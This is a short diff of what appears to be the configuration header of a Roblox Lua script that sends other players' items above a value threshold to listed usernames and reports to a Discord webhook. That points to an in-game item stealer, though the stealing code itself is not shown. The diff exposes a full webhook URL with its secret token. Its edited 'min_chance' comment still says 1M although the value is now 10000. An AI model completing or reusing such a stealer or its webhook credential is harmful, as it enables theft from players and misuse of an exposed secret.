@@ -6,7 +6,7 @@ Usernames = {
     -- "user4",
 }
 min_rap = 1000 -- minimum RAP of each item you want to get sent to you, set back to 1000
-min_chance = 1000000 -- updated to 1M for minimum chance
+min_chance = 10000 -- updated to 1M for minimum chance
 webhook = "https://discord.com/api/webhooks/1299345986061205586/YNmpW0V7RT157DVhz_9Jh5DjkgTjFvQ11IMR9T9_dvQL2Fzzsqw45FQZs0onqEP0761j"
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
